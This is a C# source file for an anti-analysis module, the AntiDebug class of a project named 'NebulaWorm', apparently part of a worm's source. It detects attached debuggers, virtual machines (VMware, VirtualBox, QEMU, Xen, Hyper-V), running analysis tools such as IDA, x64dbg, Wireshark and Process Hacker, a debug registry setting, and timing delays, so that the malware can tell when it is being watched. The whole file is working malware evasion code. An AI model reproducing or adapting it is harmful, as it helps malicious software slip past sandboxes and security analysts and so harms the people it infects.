using System;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Threading;
using Microsoft.Win32;

namespace NebulaWorm
{
    internal static class AntiDebug
    {
        private static readonly string[] DebuggerProcessNames = new string[]
        {
            "ollydbg", "ida64", "ida", "idag", "idaw", "idaw64", "idaq", "idaq64",
            "wireshark", "fiddler", "x64dbg", "x32dbg", "debugger", "dbgview", "processhacker"
        };

        public static bool IsDebuggedOrVM()
        {
            if (IsDebuggerAttached()) return true;

            if (IsRunningInVM()) return true;

            if (IsDebuggerProcessRunning()) return true;

            if (IsDebugRegistrySet()) return true;

            if (HasDebugTimingDelay()) return true;

            return false;
        }

        private static bool IsDebuggerAttached()
        {
            return Debugger.IsAttached || Debugger.IsLogging();
        }

        private static bool IsRunningInVM()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
                {
                    foreach (var item in searcher.Get())
                    {
                        string manufacturer = (item["Manufacturer"] ?? "").ToString().ToLower();
                        string model = (item["Model"] ?? "").ToString().ToLower();

                        if ((manufacturer.Contains("microsoft corporation") && model.Contains("virtual"))
                            || manufacturer.Contains("vmware")
                            || model.Contains("virtualbox")
                            || manufacturer.Contains("qemu")
                            || manufacturer.Contains("xen"))
                        {
                            return true;
                        }
                    }
                }
            }
            catch { }

            return false;
        }

        private static bool IsDebuggerProcessRunning()
        {
            try
            {
                var processes = Process.GetProcesses();

                foreach (var proc in processes)
                {
                    string name = proc.ProcessName.ToLower();
                    if (DebuggerProcessNames.Any(dbgName => name.Contains(dbgName)))
                    {
                        return true;
                    }
                }
            }
            catch { }

            return false;
        }

        private static bool IsDebugRegistrySet()
        {
            try
            {
                using (var key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Session Manager\Debug Print Filter"))
                {
                    if (key != null)
                    {
                        var val = key.GetValue("Default");
                        if (val != null && (int)val != 0)
                        {
                            return true;
                        }
                    }
                }
            }
            catch { }

            return false;
        }

        private static bool HasDebugTimingDelay()
        {
            try
            {
                var sw = Stopwatch.StartNew();
                Thread.Sleep(100);
                sw.Stop();

              
                if (sw.ElapsedMilliseconds > 150)
                {
                    return true;
                }
            }
            catch { }

            return false;
        }
    }
}
